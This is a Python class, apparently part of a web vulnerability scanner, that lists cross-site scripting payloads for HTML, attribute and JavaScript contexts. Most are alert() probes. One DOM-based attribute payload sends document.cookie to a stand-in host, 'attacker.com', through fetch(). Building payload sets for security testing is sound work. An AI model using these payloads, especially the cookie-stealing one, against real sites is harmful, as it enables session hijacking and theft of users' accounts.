from typing import List, Dict


class XSSPayloads:
    """
    Repository of XSS payload templates.
    """

    def get_reflected(self, context: str) -> List[Dict]:

        if context == "html":
            return [
                {"payload": "<script>alert('XSS')</script>"},
                {"payload": "<img src=x onerror=alert('XSS')>"},
                {"payload": "<svg onload=alert('XSS')>"},
                {"payload": "<body onload=alert('XSS')>"},
                {"payload": "<iframe src=\"javascript:alert('XSS')\">"},
            ]

        elif context == "attribute":
            return [
                {"payload": "\" onmouseover=\"alert('XSS')\""},
                {"payload": "javascript:alert('XSS')"},
                {"payload": "\" autofocus onfocus=\"alert('XSS')\""},
            ]

        elif context == "javascript":
            return [
                {"payload": "';alert('XSS');//"},
                {"payload": "</script><script>alert('XSS')</script>"},
                {"payload": "eval('al'+'ert(1)')"},
                {"payload": "Function('alert(1)')()"},
            ]

        return []

    def get_stored(self, context: str) -> List[Dict]:
        return self.get_reflected(context)

    def get_dom_based(self, context: str) -> List[Dict]:

        if context == "html":
            return [
                {"payload": "#<script>alert('XSS')</script>"},
                {"payload": "?param=<img src=x onerror=alert('XSS')>"},
            ]

        elif context == "javascript":
            return [
                {"payload": "setTimeout(\"alert('XSS')\",100)"},
                {"payload": "window.location='javascript:alert(document.cookie)'"},
            ]

        elif context == "attribute":
            return [
                {"payload": "\" onclick=\"fetch('https://attacker.com?c='+document.cookie)\""},
            ]

        return []
